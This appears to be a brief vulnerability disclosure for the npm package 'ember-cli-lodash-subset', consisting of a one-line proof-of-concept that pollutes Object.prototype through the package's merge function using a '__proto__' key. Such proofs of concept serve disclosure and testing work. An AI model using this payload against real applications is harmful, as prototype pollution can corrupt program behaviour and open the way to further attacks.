# ember-cli-locash-subset

- package name: `ember-cli-lodash-subset`

- PoC exploit:

```javascript
require('ember-cli-lodash-subset').merge({}, {['__proto__']: {polluted: 'yes'}});
```